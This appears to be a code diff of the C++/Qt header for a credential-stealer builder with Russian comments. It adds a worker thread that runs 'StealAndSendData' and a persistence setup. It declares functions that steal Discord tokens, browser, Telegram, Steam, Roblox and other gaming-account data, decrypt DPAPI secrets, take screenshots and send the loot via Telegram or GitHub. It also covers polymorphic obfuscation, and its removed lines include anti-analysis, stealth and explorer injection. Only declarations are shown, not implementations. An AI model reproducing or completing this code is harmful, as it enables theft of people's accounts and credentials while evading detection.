@@ -26,6 +26,7 @@
 #include <QMutex>
 #include <QHttpMultiPart>
 #include <QApplication>
+#include <QThread>
 #include <array>
 #include <random>
 #include <sstream>
@@ -84,6 +85,27 @@ private:
     std::mt19937 engine;
 };
 
+// Класс для работы в отдельном потоке
+class StealerWorker : public QObject {
+    Q_OBJECT
+public:
+    StealerWorker(MainWindow* mainWindow, const std::string& tempDir)
+        : mainWindow(mainWindow), tempDir(tempDir) {}
+
+public slots:
+    void process() {
+        mainWindow->StealAndSendData(tempDir);
+        emit finished();
+    }
+
+signals:
+    void finished();
+
+private:
+    MainWindow* mainWindow;
+    std::string tempDir;
+};
+
 class MainWindow : public QMainWindow
 {
     Q_OBJECT
@@ -101,6 +123,7 @@ public:
     void emitLog(const QString& message);
 
     void updateConfigFromUI();
+    void setupPersistence();
 
     // Структура для хранения настроек
     struct Config {
@@ -115,8 +138,6 @@ public:
         bool passwords = false;
         bool screenshot = false;
         bool fileGrabber = false;
-        bool stealFiles = false;
-        std::vector<std::string> files;
         bool systemInfo = false;
         bool socialEngineering = false;
         bool chatHistory = false;
@@ -127,7 +148,6 @@ public:
         bool autoStart = false;
         bool persist = false;
         bool selfDestruct = false;
-        bool encryptData = false;
         std::string sendMethod = "Local File";
         std::string buildMethod = "Local Build";
         std::string telegramBotToken = "";
@@ -137,10 +157,6 @@ public:
         std::string iconPath = "";
         std::string githubToken = "";
         std::string githubRepo = "";
-        bool sendToTelegram = false;
-        bool sendToDiscord = false;
-        bool sendToServer = false;
-        // Ключи и соль теперь не сохраняются в конфигурации, а генерируются для каждого билда
     } config;
 
     // UI элементы
@@ -184,9 +200,6 @@ public:
     QAction* actionExit;
     QAction* actionAbout;
 
-    // Вектор для хранения путей к скриншотам
-    std::vector<std::string> screenshotsPaths;
-
     // Векторы для хранения собранных данных
     std::string collectedData;
     std::vector<std::string> collectedFiles;
@@ -200,9 +213,6 @@ signals:
 
 public slots:
     void sendData(const QString& encryptedData, const std::vector<std::string>& files);
-    void sendDataToServer(const std::string& data, const std::vector<std::string>& files);
-    void sendToTelegram(const std::string& data, const std::vector<std::string>& files);
-    void sendToDiscord(const std::string& data, const std::vector<std::string>& files);
     void replyFinished(QNetworkReply *reply);
 
 private slots:
@@ -213,12 +223,6 @@ private slots:
     void copyIconToBuild();
     void buildExecutable();
 
-    // Методы для создания и шифрования билда
-    std::string generateRandomKey(size_t length);
-    std::string generateStubCode(const std::string& key);
-    bool encryptBuild(const std::string& buildPath, const std::string& key1, const std::string& key2, const std::string& salt);
-    bool compileBuild(const std::string& polymorphicCode, const std::string& junkCode);
-
     // Слоты для GitHub Actions
     void triggerGitHubActions();
     void checkBuildStatus();
@@ -228,9 +232,9 @@ private slots:
     void startStealProcess();
     std::string TakeScreenshot(const std::string& dir);
     std::string stealBrowserData(const std::string& dir);
-    std::vector<std::string> StealDiscordTokens();
+    std::string StealDiscordTokens(const std::string& dir);
     std::string StealTelegramData(const std::string& dir);
-    std::vector<std::string> StealSteamData();
+    std::string StealSteamData(const std::string& dir);
     std::string StealEpicGamesData(const std::string& dir);
     std::string StealRobloxData(const std::string& dir);
     std::string StealBattleNetData(const std::string& dir);
@@ -238,30 +242,20 @@ private slots:
     std::vector<std::string> GrabFiles(const std::string& dir);
     std::string stealChatHistory(const std::string& dir);
     std::string collectSocialEngineeringData(const std::string& dir);
+    std::string collectSystemInfo(const std::string& dir);
     std::string archiveData(const std::string& dir, const std::vector<std::string>& files);
     std::string encryptData(const std::string& data);
-    std::string decryptData(const std::string& encryptedData);
-    void saveToLocalFile(const std::string& data, const std::string& dir);
 
     // Слоты для управления конфигурацией и логами
     void saveConfig();
     void loadConfig();
     void exportLogs();
-    void appendLog(const QString& message, const QString& type);
+    void appendLog(const QString& message);
 
-    // Методы для уникального шифрования и обфускации
+    // Методы для шифрования и обфускации
     void generateEncryptionKeys();
     void obfuscateExecutable(const std::string& exePath);
     void applyPolymorphicObfuscation(const std::string& exePath);
-
-    // Методы для скрытности
-    bool AntiAnalysis();
-    void Stealth();
-    void Persist();
-    void FakeError();
-    void SelfDestruct();
-    bool checkDependencies();
-    bool InjectIntoExplorer();
 
     // Слоты для обработки действий пользователя
     void on_iconBrowseButton_clicked();
@@ -270,25 +264,19 @@ private slots:
 
 private:
     // Приватные методы
-    void animateSection(QLabel* sectionLabel, QSpacerItem* spacer);
-    QByteArray applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key);
-    QByteArray applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv);
     QByteArray decryptDPAPIData(const QByteArray& encryptedData);
-    std::string CreateZipArchive(const std::string& dir, const std::vector<std::string>& files);
 
     // Приватные члены
     Ui::MainWindow *ui;
     QNetworkAccessManager *manager;
     QMutex logMutex;
-    bool isBuilding;
-    QTimer *buildTimer;
+    bool isBuilding = false;
     QTimer *statusCheckTimer;
-    QString workflowRunId; // Для хранения ID workflow run
-    qint64 runId;
-    qint64 artifactId;
-    std::string encryptionKey1; // Приватное поле для хранения сгенерированного ключа
-    std::string encryptionKey2; // Приватное поле для хранения сгенерированного ключа
-    std::string encryptionSalt; // Приватное поле для хранения сгенерированной соли
+    qint64 runId = 0;
+    qint64 artifactId = 0;
+    std::string encryptionKey1;
+    std::string encryptionKey2;
+    std::string encryptionSalt;
 };
 
 #endif // MAINWINDOW_H
